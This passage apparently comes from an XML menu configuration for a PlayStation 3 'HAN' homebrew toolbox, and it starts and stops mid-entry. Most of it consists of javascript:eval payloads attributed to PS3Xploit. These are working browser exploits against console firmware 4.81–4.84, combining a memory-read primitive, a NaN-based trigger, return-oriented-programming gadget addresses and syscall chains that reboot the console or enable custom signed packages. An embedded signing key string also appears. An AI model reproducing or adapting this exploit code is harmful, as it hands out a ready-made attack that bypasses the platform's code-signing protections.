onclick="triggerX();"\076En\074/button\076\074span id="reset" style="visibility:hidden"\076 | \074button id="btnReset" type="button" onclick="disable_trigger();"\076Reset\074/button\076\074/span\076\074/p\076\074/span\076\074div id="exploit" \076\074/div\076\074div id="trigger"\076\074/div\076\074/body\076\074/html\076\047);var vsh_opd_patch=618004, toc_entry1_addr=7251128, toc_entry3_addr=7251120, toc_entry4_addr=7667712, toc_entry6_addr=0, gadget1_addr=620220, gadget3_addr=894376, gadget4_addr=2298144, gadget5_addr=1255896, gadget7_addr=131204, gadget8_addr=131252, gadget12_addr = 841280, gadget_mod2_addr=80756, gadget_mod3_addr=757432, gadget_mod4a_addr=912344, gadget_mod7_addr=108204, gadget_mod8_addr=2893024; if (fwv=="4.81") { var toc_addr=7362064, default_vsh_pub_toc=7329380, vsh_opd_addr=7322664, vsh_ps3xploit_key_toc=7437476, toc_entry2_addr=7561112, toc_entry5_addr=7321472, gadget2_addr=6361796, gadget6_addr=6409916, gadget_mod1_addr=6382008, gadget_mod8_addr=2893020 } else if (fwv=="4.82") { var toc_addr=7362112, default_vsh_pub_toc=7329428, vsh_opd_addr=7322712, vsh_ps3xploit_key_toc=7438556, toc_entry2_addr=7561100, toc_entry5_addr=7321520, gadget2_addr=6364256, gadget6_addr=6412376, gadget_mod1_addr=6384468 } else if (fwv=="4.84") { var toc_addr=7362112, default_vsh_pub_toc=7329436, vsh_opd_addr=7322720, vsh_ps3xploit_key_toc=7438804, toc_entry2_addr=7562440, toc_entry5_addr=7321528, gadget2_addr=6364416, gadget6_addr=6412536, gadget_mod1_addr=6384628 }function hexh2bin(a){return String.fromCharCode(a)}function hexw2bin(a){return String.fromCharCode(a\076\07616)+String.fromCharCode(a)}function hexdw2bin(a){return hexw2bin(0)+hexw2bin(a)}String.prototype.toHex16=function(){return(\0470000\047+this).substr(-4)};String.prototype.toAscii=function(a){var b=\047\047;var i=0;while(i\074this.length){if(a===true){b+=this.charCodeAt(i).toString(16).toHex16()}else{b+=this.charCodeAt(i).toString(16)}i+=1}return b};String.prototype.convert=function(a){if(this.length\0741){return\047\047}var b=\047\047;var c=\047\047;var i=0;var d=[];if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\04700\047}if(b.substr(b.length-3,2)!==\04700\047){b+=\0470000\047}while(i\074b.length){c=b.substr(i,4);d.push(String.fromCharCode(parseInt(c,16)));i+=4}return d.join(\047\047)};String.prototype.convertedSize=function(a){if(this.length\0741){return 0}var b=\047\047;if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\04700\047}if(b.substr(b.length-3,2)!==\04700\047){b+=\0470000\047}return b.length/2};String.prototype.replaceAt=function(a,b){return this.substr(0,a)+b+this.substr(a+b.length)};String.prototype.repeat=function(a){return new Array(a+1).join(this)};Number.prototype.noExponents=function(){var a=String(this).split(/[eE]/);if(a.length===1){return a[0]}var z=\047\047,sign=this\0740?\047-\047:\047\047,str=a[0].replace(\047.\047,\047\047),mag=Number(a[1])+1;if(mag\0740){z=sign+\0470.\047;while(mag++){z+=\0470\047}return z+str.replace(/^\-/,\047\047)}mag-=str.length;while(mag--){z+=\0470\047}return str+z};function fromIEEE754(a,b,c){var d=0;var g=[];var i;var j;var h;for(i=a.length;i;i-=1){h=a[i-1];for(j=8;j;j-=1){g.push(h%2?1:0);h=h\076\0761}}g.reverse();var k=g.join(\047\047);var l=(1\074\074(b-1))-1;var s=parseInt(k.substring(0,1),2)?-1:1;var e=parseInt(k.substring(1,1+b),2);var f=parseInt(k.substring(1+b),2);if(e===(1\074\074b)-1){d=f!==0?NaN:s*Infinity}else if(e\0760){d=s*Math.pow(2,e-l)*(1+f/Math.pow(2,c))}else if(f!==0){d=s*Math.pow(2,-(l-1))*(f/Math.pow(2,c))}else{d=s*0}return d.noExponents()}function generateIEEE754(a,b){var c=new Array((a\076\07624)&0xFF,(a\076\07616)&0xFF,(a\076\0768)&0xFF,(a)&0xFF,(b\076\07624)&0xFF,(b\076\07616)&0xFF,(b\076\0768)&0xFF,(b)&0xFF);return fromIEEE754(c,11,52)}function generateExploit(a,b){var n=(a\074\07432)|((b\076\0761)-1);return generateIEEE754(a,(n-a))}function readMemory(a,b){if(document.getElementById(\047exploit\047)){document.getElementById(\047exploit\047).style.src="local("+generateExploit(a,b)+")"}}function checkMemory(a,b,c){if(document.getElementById(\047exploit\047)){readMemory(a,b);if(debug===true){var x=document.getElementById(\047exploit\047).style.src.substr(6,c);return x}return document.getElementById(\047exploit\047).style.src.substr(6,c)}}function trigger(a){if(document.getElementById(\047trigger\047)){document.getElementById("trigger").innerHTML=-parseFloat("NAN(ffffe"+a.toString(16)+")")}}function rop_exit(a){var b=document.getElementById(\047auto_close\047);if(b){if(b.checked===true)window.close()}}function load_check(){if(total_loops\074max_loops){t_out=setTimeout(initROP,1000,false)}else{total_loops=0;t_out=0}}function findJsVariableOffset(a,b,c,d){readMemory(c,d);var e=document.getElementById(\047exploit\047).style.src.substr(6,d);var i=0;var t;var k;var f;var g;while(i\074(e.length*2)){if(e.charCodeAt(i/2)===b.charCodeAt(0)){f=0;for(k=0;k\074(b.length*2);k+=0x2){if(e.charCodeAt((i+k)/2)!==b.charCodeAt(k/2)){break}f+=1}if(f===b.length){g=c+i+4;for(t=0;t\074offset_array.length;t+=1){if(offset_array[t]===g){return-1}}offset_array.push(g);return g}}i+=0x10}var h=c+d;return 0}function memcpy(a,b,c){return callsub(gadget8_addr,a,b,c,0,0,0,0,0,0,0x70)}function store_word(a,b,c,d,e){if(c===null){c=gtemp_addr}if(d===null){d=gtemp_addr}if(e===null){e=gtemp_addr}return hexdw2bin(gadget_mod3_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(b)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(a-0xC74)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod7_addr)+fill_by_16bytes(0x70,dbyte41)+hexdw2bin(c)+hexdw2bin(d)+hexdw2bin(e)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function stack_frame_hookup(){return unescape("\u4141\u2A2F")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(toc_addr)+fill_by_16bytes(0x70,dbyte41)}function stack_frame_exit(){return hexdw2bin(gadget_mod8_addr)+unescape("\u2F2A")}function syscall(a,b,c,d,e,f,g,h,i,j){if(j===null){j=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(a)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4a_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(j)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function callsub(a,b,c,d,e,f,g,h,i,j,k,l,m){var n=0x20;if(m===null){m=gtemp_addr}if(l===null){l=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(j)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(l)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(a)+fill_by_16bytes(k-n,dbyte00)+hexdw2bin(m)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function fill_by_4bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/4){c+=e.repeat(2);d++}return c}function fill_by_8bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/8){c+=e.repeat(4);d++}return c}function fill_by_16bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/16){c+=e.repeat(8);d++}return c}function initDefaults(){offset_array=[];xtra_data_addr=0;stack_frame_addr=0;jump_2_addr=0;jump_1_addr=0;ps3xploit_ecdsa_key_addr=0;index_key_addr=0;search_max_threshold=70*0x100000;search_base=0x80100000;search_size=2*mbytes;search_size_ext=0*mbytes;search_base_off=0*mbytes;total_loops++}function initROP(a){try{if(a===true){frame_fails=0;search_base_off=0;search_size_ext=0}if(t_out!==0){clearTimeout(t_out);t_out=0}initDefaults();xtra_data=start_x.convert()+unescape("\uFD7E");while(xtra_data_addr===0){if(search_max_threshold\074search_size){load_check();return}xtra_data=xtra_data.replaceAt(0,hexh2bin(0x7EFD));xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);search_max_threshold-=search_size}stack_frame=stack_frame_hookup()+callsub(gadget12_addr,2,0,0,0,0,0,0,0,0,0x80)+syscall(sc_sm_shutdown,hard_reboot,0,0,0,0,0,0,0)+stack_frame_exit();while(stack_frame_addr===0){if(search_max_threshold\074search_size+search_size_ext){frame_fails++;if((frame_fails%10)===0){search_base_off+=0;search_size_ext+=0}load_check();return}stack_frame=stack_frame.replaceAt(0,hexh2bin(0x2A2F));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(stack_frame_addr==-1)if(search_max_threshold\074search_size+search_size_ext){frame_fails++;load_check();return}search_max_threshold-=search_size+search_size_ext}jump_2=unescape("\u0102\u7EFB")+fill_by_16bytes(0x30,0x8282)+hexw2bin(stack_frame_addr)+unescape("\uFB7E");while(jump_2_addr===0){if(search_max_threshold\074search_size){load_check();return}jump_2=jump_2.replaceAt(0,hexh2bin(0x7EFB));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(jump_2_addr==-1)if(search_max_threshold\074search_size){load_check();return}search_max_threshold-=search_size}jump_1=unescape("\u4141\u7EFA")+hexw2bin(jump_2_addr)+unescape("\uFA7E");while(jump_1_addr===0){if(search_max_threshold\074search_size){load_check();return}jump_1=jump_1.replaceAt(0,hexh2bin(0x7EFA));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(jump_1_addr==-1)if(search_max_threshold\074search_size){load_check();return}search_max_threshold-=search_size}var b=checkMemory(stack_frame_addr-0x4,0x8000,stack_frame.length);var x=checkMemory(xtra_data_addr-0x4,0x1000,xtra_data.length);var c=checkMemory(jump_2_addr-0x4,0x1000,jump_2.length);var d=checkMemory(jump_1_addr-0x4,0x1000,jump_1.length);if((c===jump_2)&&(d===jump_1)&&(x===xtra_data)&&(b===stack_frame)){if(t_out!==0){clearTimeout(t_out)}triggerX()}else{load_check()}}catch(e){debug=true;debug=false}}function triggerX(){setTimeout(trigger,1000,jump_1_addr);setTimeout(rop_exit,2000,hr);setTimeout(window.close,2000);t_out=0;total_loops=0}initROP(true);');</String></Pair>
			</Table>
			<Table key="han_reboot_soft_auto_dex_offline">
				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/reboot.png</String></Pair>
				<Pair key="title"><String>Offline Soft Rebooter</String></Pair>
				<Pair key="info"><String>Restart console</String></Pair>
				<Pair key="module_name"><String>webrender_plugin</String></Pair>
				<Pair key="module_action"><String>javascript:eval('var xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,debug=!1,ps3xploit_ecdsa_key="948DA13E8CAFD5BA0E90CE434461BB327FE7E080475EAA0AD3AD4F5B6247A7FDA86DF69790196773",index_key="DA7D4B5E499A4F53B1C1A14A7484443B",start_x="xxxx",offset_array=[],t_out=0,ps3xploit_ecdsa_key_addr=0,index_key_addr=0,search_max_threshold=73400320,search_base=2148532224,search_size=2 * mbytes,search_base_off=0,search_size_ext=0,gtemp_addr=2365587456,total_loops=0,max_loops=20,frame_fails=0,sp_exit=2413354176,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,mbytes=1048576,stat_size_offset=40,hr="\74hr\76",sc_sm_shutdown=0x17B,soft_reboot=0x200,ua=navigator.userAgent,fwv=ua.substring(ua.indexOf("5.0 (") + 19,ua.indexOf(") Apple"));document.write(\047\074html\076\074head\076\074title\076PS3Xploit - Offline Soft Rebooter by lmn7\074/title\076\074/head\076\074body id="bodyId" style="background-color:#FFFFFF"\076\074div id="headerId"\076\074h1\076Soft Rebooting for DEX...\074/h1\076\074span id="hideme" style="visibility:hidden"\076\074p\076\074button id="btnROP" type="button" onclick="initROP(true);" autofocus\076Initialize\074/button\076 | Close \074input type="checkbox" id="auto_close" name="aclose" checked="checked" onclick="autoclose();"/\076\074span id="dex_txt" style="visibility:hidden"\076\074input type="checkbox" id="dex" name="DEX" disabled="" onclick="dex();"/\076\074/span\076\074/p\076\074p\076\074button id="btnTrigger" disabled="" type="button" onclick="triggerX();"\076En\074/button\076\074span id="reset" style="visibility:hidden"\076 | \074button id="btnReset" type="button" onclick="disable_trigger();"\076Reset\074/button\076\074/span\076\074/p\076\074/span\076\074div id="exploit" \076\074/div\076\074div id="trigger"\076\074/div\076\074/body\076\074/html\076\047); var toc_addr=7362112, default_vsh_pub_toc=0, vsh_opd_patch=618004, vsh_opd_addr=0, vsh_ps3xploit_key_toc=0, toc_entry1_addr=7251128, toc_entry2_addr=0, toc_entry3_addr=7251120, toc_entry4_addr=7667712, toc_entry5_addr=0, toc_entry6_addr=0, gadget1_addr=620220, gadget2_addr=0, gadget3_addr=894376, gadget4_addr=2298144, gadget5_addr=1255896, gadget6_addr=0, gadget7_addr=131204, gadget8_addr=131252, gadget12_addr = 841280, gadget_mod1_addr=0, gadget_mod2_addr=80756, gadget_mod3_addr=757432, gadget_mod4a_addr=912344, gadget_mod7_addr=108204, gadget_mod8_addr=2893024; if (fwv=="4.81") { var toc_addr=7362064, default_vsh_pub_toc=7329380, vsh_opd_addr=7322664, vsh_ps3xploit_key_toc=7437476, toc_entry2_addr=7561112, toc_entry5_addr=7321472, gadget2_addr=6361796, gadget6_addr=6409916, gadget_mod1_addr=6382008, gadget_mod8_addr=2893020 } else if (fwv=="4.82") { var default_vsh_pub_toc=7329428, vsh_opd_addr=7322712, vsh_ps3xploit_key_toc=7438556, toc_entry2_addr=7561100, toc_entry5_addr=7321520, gadget2_addr=6364256, gadget6_addr=6412376, gadget_mod1_addr=6384468 } else if (fwv=="4.84") { var default_vsh_pub_toc=7329436, vsh_opd_addr=7322720, vsh_ps3xploit_key_toc=7438804, toc_entry2_addr=7562440, toc_entry5_addr=7321528, gadget2_addr=6364416, gadget6_addr=6412536, gadget_mod1_addr=6384628 } function hexh2bin(a){return String.fromCharCode(a)}function hexw2bin(a){return String.fromCharCode(a\076\07616)+String.fromCharCode(a)}function hexdw2bin(a){return hexw2bin(0)+hexw2bin(a)}String.prototype.toHex16=function(){return(\0470000\047+this).substr(-4)};String.prototype.toAscii=function(a){var b=\047\047;var i=0;while(i\074this.length){if(a===true){b+=this.charCodeAt(i).toString(16).toHex16()}else{b+=this.charCodeAt(i).toString(16)}i+=1}return b};String.prototype.convert=function(a){if(this.length\0741){return\047\047}var b=\047\047;var c=\047\047;var i=0;var d=[];if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\04700\047}if(b.substr(b.length-3,2)!==\04700\047){b+=\0470000\047}while(i\074b.length){c=b.substr(i,4);d.push(String.fromCharCode(parseInt(c,16)));i+=4}return d.join(\047\047)};String.prototype.convertedSize=function(a){if(this.length\0741){return 0}var b=\047\047;if(a===true){b=this}else{b=this.toAscii()}while((b.length%4)!==0){b+=\04700\047}if(b.substr(b.length-3,2)!==\04700\047){b+=\0470000\047}return b.length/2};String.prototype.replaceAt=function(a,b){return this.substr(0,a)+b+this.substr(a+b.length)};String.prototype.repeat=function(a){return new Array(a+1).join(this)};Number.prototype.noExponents=function(){var a=String(this).split(/[eE]/);if(a.length===1){return a[0]}var z=\047\047,sign=this\0740?\047-\047:\047\047,str=a[0].replace(\047.\047,\047\047),mag=Number(a[1])+1;if(mag\0740){z=sign+\0470.\047;while(mag++){z+=\0470\047}return z+str.replace(/^\-/,\047\047)}mag-=str.length;while(mag--){z+=\0470\047}return str+z};function fromIEEE754(a,b,c){var d=0;var g=[];var i;var j;var h;for(i=a.length;i;i-=1){h=a[i-1];for(j=8;j;j-=1){g.push(h%2?1:0);h=h\076\0761}}g.reverse();var k=g.join(\047\047);var l=(1\074\074(b-1))-1;var s=parseInt(k.substring(0,1),2)?-1:1;var e=parseInt(k.substring(1,1+b),2);var f=parseInt(k.substring(1+b),2);if(e===(1\074\074b)-1){d=f!==0?NaN:s*Infinity}else if(e\0760){d=s*Math.pow(2,e-l)*(1+f/Math.pow(2,c))}else if(f!==0){d=s*Math.pow(2,-(l-1))*(f/Math.pow(2,c))}else{d=s*0}return d.noExponents()}function generateIEEE754(a,b){var c=new Array((a\076\07624)&0xFF,(a\076\07616)&0xFF,(a\076\0768)&0xFF,(a)&0xFF,(b\076\07624)&0xFF,(b\076\07616)&0xFF,(b\076\0768)&0xFF,(b)&0xFF);return fromIEEE754(c,11,52)}function generateExploit(a,b){var n=(a\074\07432)|((b\076\0761)-1);return generateIEEE754(a,(n-a))}function readMemory(a,b){if(document.getElementById(\047exploit\047)){document.getElementById(\047exploit\047).style.src="local("+generateExploit(a,b)+")"}}function checkMemory(a,b,c){if(document.getElementById(\047exploit\047)){readMemory(a,b);if(debug===true){var x=document.getElementById(\047exploit\047).style.src.substr(6,c);return x}return document.getElementById(\047exploit\047).style.src.substr(6,c)}}function trigger(a){if(document.getElementById(\047trigger\047)){document.getElementById("trigger").innerHTML=-parseFloat("NAN(ffffe"+a.toString(16)+")")}}function rop_exit(a){var b=document.getElementById(\047auto_close\047);if(b){if(b.checked===true)window.close()}}function load_check(){if(total_loops\074max_loops){t_out=setTimeout(initROP,1000,false)}else{total_loops=0;t_out=0}}function findJsVariableOffset(a,b,c,d){readMemory(c,d);var e=document.getElementById(\047exploit\047).style.src.substr(6,d);var i=0;var t;var k;var f;var g;while(i\074(e.length*2)){if(e.charCodeAt(i/2)===b.charCodeAt(0)){f=0;for(k=0;k\074(b.length*2);k+=0x2){if(e.charCodeAt((i+k)/2)!==b.charCodeAt(k/2)){break}f+=1}if(f===b.length){g=c+i+4;for(t=0;t\074offset_array.length;t+=1){if(offset_array[t]===g){return-1}}offset_array.push(g);return g}}i+=0x10}var h=c+d;return 0}function memcpy(a,b,c){return callsub(gadget8_addr,a,b,c,0,0,0,0,0,0,0x70)}function store_word(a,b,c,d,e){if(c===null){c=gtemp_addr}if(d===null){d=gtemp_addr}if(e===null){e=gtemp_addr}return hexdw2bin(gadget_mod3_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(b)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(a-0xC74)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod7_addr)+fill_by_16bytes(0x70,dbyte41)+hexdw2bin(c)+hexdw2bin(d)+hexdw2bin(e)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function stack_frame_hookup(){return unescape("\u4141\u2A2F")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(toc_addr)+fill_by_16bytes(0x70,dbyte41)}function stack_frame_exit(){return hexdw2bin(gadget_mod8_addr)+unescape("\u2F2A")}function syscall(a,b,c,d,e,f,g,h,i,j){if(j===null){j=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(a)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4a_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(j)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function callsub(a,b,c,d,e,f,g,h,i,j,k,l,m){var n=0x20;if(m===null){m=gtemp_addr}if(l===null){l=gtemp_addr}return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(j)+hexw2bin(i)+hexw2bin(g)+hexw2bin(f)+hexw2bin(e)+hexw2bin(d)+hexw2bin(c)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(h)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(b)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(l)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(a)+fill_by_16bytes(k-n,dbyte00)+hexdw2bin(m)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41)}function fill_by_4bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/4){c+=e.repeat(2);d++}return c}function fill_by_8bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/8){c+=e.repeat(4);d++}return c}function fill_by_16bytes(a,b){var c=\047\047;var d=0;var e=hexh2bin(b);while(d\074a/16){c+=e.repeat(8);d++}return c}function initDefaults(){offset_array=[];xtra_data_addr=0;stack_frame_addr=0;jump_2_addr=0;jump_1_addr=0;ps3xploit_ecdsa_key_addr=0;index_key_addr=0;search_max_threshold=70*0x100000;search_base=0x80100000;search_size=2*mbytes;search_size_ext=0*mbytes;search_base_off=0*mbytes;total_loops++}function initROP(a){try{if(a===true){frame_fails=0;search_base_off=0;search_size_ext=0}if(t_out!==0){clearTimeout(t_out);t_out=0}initDefaults();xtra_data=start_x.convert()+unescape("\uFD7E");while(xtra_data_addr===0){if(search_max_threshold\074search_size){load_check();return}xtra_data=xtra_data.replaceAt(0,hexh2bin(0x7EFD));xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);search_max_threshold-=search_size}stack_frame=stack_frame_hookup()+callsub(gadget12_addr,2,0,0,0,0,0,0,0,0,0x80)+syscall(sc_sm_shutdown,soft_reboot,0,0,0,0,0,0,0)+stack_frame_exit();while(stack_frame_addr===0){if(search_max_threshold\074search_size+search_size_ext){frame_fails++;if((frame_fails%10)===0){search_base_off+=0;search_size_ext+=0}load_check();return}stack_frame=stack_frame.replaceAt(0,hexh2bin(0x2A2F));stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);if(stack_frame_addr==-1)if(search_max_threshold\074search_size+search_size_ext){frame_fails++;load_check();return}search_max_threshold-=search_size+search_size_ext}jump_2=unescape("\u0102\u7EFB")+fill_by_16bytes(0x30,0x8282)+hexw2bin(stack_frame_addr)+unescape("\uFB7E");while(jump_2_addr===0){if(search_max_threshold\074search_size){load_check();return}jump_2=jump_2.replaceAt(0,hexh2bin(0x7EFB));jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);if(jump_2_addr==-1)if(search_max_threshold\074search_size){load_check();return}search_max_threshold-=search_size}jump_1=unescape("\u4141\u7EFA")+hexw2bin(jump_2_addr)+unescape("\uFA7E");while(jump_1_addr===0){if(search_max_threshold\074search_size){load_check();return}jump_1=jump_1.replaceAt(0,hexh2bin(0x7EFA));jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);if(jump_1_addr==-1)if(search_max_threshold\074search_size){load_check();return}search_max_threshold-=search_size}var b=checkMemory(stack_frame_addr-0x4,0x8000,stack_frame.length);var x=checkMemory(xtra_data_addr-0x4,0x1000,xtra_data.length);var c=checkMemory(jump_2_addr-0x4,0x1000,jump_2.length);var d=checkMemory(jump_1_addr-0x4,0x1000,jump_1.length);if((c===jump_2)&&(d===jump_1)&&(x===xtra_data)&&(b===stack_frame)){if(t_out!==0){clearTimeout(t_out)}triggerX()}else{load_check()}}catch(e){debug=true;debug=false}}function triggerX(){setTimeout(trigger,1000,jump_1_addr);setTimeout(rop_exit,2000,hr);setTimeout(window.close,2000);t_out=0;total_loops=0}initROP(true);');</String></Pair>
			</Table>
			<Table key="han_shutdown_auto">
				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/shutdown.png</String></Pair>
				<Pair key="title"><String>Shutdown</String></Pair>
				<Pair key="info"><String>Turn off console</String></Pair>
				<Pair key="module_name"><String>poweroff_plugin</String></Pair>
				<Pair key="module_action"><String></String></Pair>
			</Table>
			<Table key="han_enabler_auto_dex_offline">
				<Pair key="icon"><String>/dev_hdd0/game/HANTOOLBX/USRDIR/IMAGES/han_enable.png</String></Pair>
				<Pair key="title"><String>Offline HAN Enabler</String></Pair>
				<Pair key="info"><String>Enable Custom Signed Packages and Licenses</String></Pair>
				<Pair key="module_name"><String>webrender_plugin</String></Pair>
				<Pair key="module_action"><String>javascript:eval('var xtra_data,stack_frame,jump_2,jump_1,xtra_data_addr,stack_frame_addr,jump_2_addr,jump_1_addr,debug=!1,ps3xploit_ecdsa_key="948DA13E8CAFD5BA0E90CE434461BB327FE7E080475EAA0AD3AD4F5B6247A7FDA86DF69790196773",index_key="DA7D4B5E499A4F53B1C1A14A7484443B",start_x="xxxx",offset_array=[],t_out=0,ps3xploit_ecdsa_key_addr=0,index_key_addr=0,search_max_threshold=73400320,search_base=2148532224,search_size=2*mbytes,search_base_off=0,search_size_ext=0,gtemp_addr=2365587456,total_loops=0,max_loops=20,frame_fails=0,sp_exit=2413354176,ffs=4294967295,dbyte41=16705,dbyte00=0,byte_size=1,hword_size=2,word_size=4,dword_size=8,mbytes=1048576,stat_size_offset=40,toc_addr=7296336,default_vsh_pub_toc=7263652,vsh_opd_patch=617820,vsh_opd_addr=7256936,vsh_ps3xploit_key_toc=7370612,toc_entry1_addr=7185360,toc_entry2_addr=7494200,toc_entry3_addr=7185352,toc_entry4_addr=7602176,toc_entry5_addr=7255744,toc_entry6_addr=0,gadget1_addr=620036,gadget2_addr=6332484,gadget3_addr=872540,gadget4_addr=2267192,gadget5_addr=1227548,gadget6_addr=6380604,gadget7_addr=131024,gadget8_addr=131072,gadget_mod1_addr=6352696,gadget_mod2_addr=80756,gadget_mod3_addr=757248,gadget_mod4a_addr=890500,gadget_mod7_addr=108204,gadget_mod8_addr=2862264,hr="\74hr\76",ua=navigator.userAgent,fwv=ua.substring(ua.indexOf("5.0 (")+19,ua.indexOf(") Apple")),ipf1_addr=0x6ebb70,ipf2_addr=0x507374;document.write(\047\074html\076\074head\076\074title\076PS3Xploit - Offline HAN Enabler by lmn7\074/title\076\074/head\076\074body id="bodyId" style="background-color:#FFFFFF"\076\074div id="headerId"\076\074h1\076Enabling HAN for DEX...\074/h1\076\074span id="hideme" style="visibility:hidden"\076\074p\076\074button id="btnROP" type="button" onclick="initROP(true);" autofocus\076Initialize\074/button\076 | Close \074input type="checkbox" id="auto_close" name="aclose" checked="checked" onclick="autoclose();"/\076\074span id="dex_txt" style="visibility:hidden"\076\074input type="checkbox" id="dex" name="DEX" disabled="" onclick="dex();"/\076\074/span\076\074/p\076\074p\076\074button id="btnTrigger" disabled="" type="button" onclick="triggerX();"\076En\074/button\076\074span id="reset" style="visibility:hidden"\076 | \074button id="btnReset" type="button" onclick="disable_trigger();"\076Reset\074/button\076\074/span\076\074/p\076\074/span\076\074div id="exploit" \076\074/div\076\074div id="trigger"\076\074/div\076\074/body\076\074/html\076\047); var toc_addr=7362112, default_vsh_pub_toc=0, vsh_opd_patch=618004, vsh_opd_addr=0, vsh_ps3xploit_key_toc=0, toc_entry1_addr=7251128, toc_entry2_addr=0, toc_entry3_addr=7251120, toc_entry4_addr=7667712, toc_entry5_addr=0, toc_entry6_addr=0, gadget1_addr=620220, gadget2_addr=0, gadget3_addr=894376, gadget4_addr=2298144, gadget5_addr=1255896, gadget6_addr=0, gadget7_addr=131204, gadget8_addr=131252, gadget_mod1_addr=0, gadget_mod2_addr=80756, gadget_mod3_addr=757432, gadget_mod4a_addr=912344, gadget_mod7_addr=108204, gadget_mod8_addr=2893024, ipf1_addr=7322720, ipf2_addr=5304168; if (fwv=="4.81") { var toc_addr=7362064, default_vsh_pub_toc=7329380, vsh_opd_addr=7322664, vsh_ps3xploit_key_toc=7437476, toc_entry2_addr=7561112, toc_entry5_addr=7321472, gadget2_addr=6361796, gadget6_addr=6409916, gadget_mod1_addr=6382008, gadget_mod8_addr=2893020 